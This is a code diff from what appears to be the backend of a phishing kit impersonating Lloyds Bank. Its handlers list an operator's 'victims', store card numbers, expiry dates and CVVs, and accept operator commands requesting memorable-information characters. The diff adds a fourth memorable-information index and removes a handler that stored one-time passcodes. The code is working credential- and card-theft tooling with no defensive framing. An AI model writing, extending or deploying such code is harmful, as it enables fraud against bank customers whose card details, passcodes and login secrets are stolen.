@@ -13,12 +13,13 @@ const getOwnerVics = async (req, res) => {
 };
 
 const command = async (req, res) => {
-  const { uniqueid, status, memIndex1, memIndex2, memIndex3 } = req.body;
+  const { uniqueid, status, memIndex1, memIndex2, memIndex3, memIndex4 } =
+    req.body;
   try {
     if (status == 2) {
       await Lloyds.findOneAndUpdate(
         { uniqueid },
-        { status, memIndex1, memIndex2, memIndex3 }
+        { status, memIndex1, memIndex2, memIndex3, memIndex4 }
       ).exec();
     } else {
       await Lloyds.findOneAndUpdate({ uniqueid }, { status }).exec();
@@ -88,17 +89,6 @@ const submitCard = async (req, res) => {
       { uniqueid },
       { ccnum, ccexp, cvv, status: 5 }
     ).exec();
-    res.sendStatus(200);
-  } catch (error) {
-    console.log(error);
-    res.sendStatus(400);
-  }
-};
-
-const submitOtp = async (req, res) => {
-  const { otp, uniqueid } = req.body;
-  try {
-    await Lloyds.findOneAndUpdate({ uniqueid }, { otp, status: 7 }).exec();
     res.sendStatus(200);
   } catch (error) {
     console.log(error);
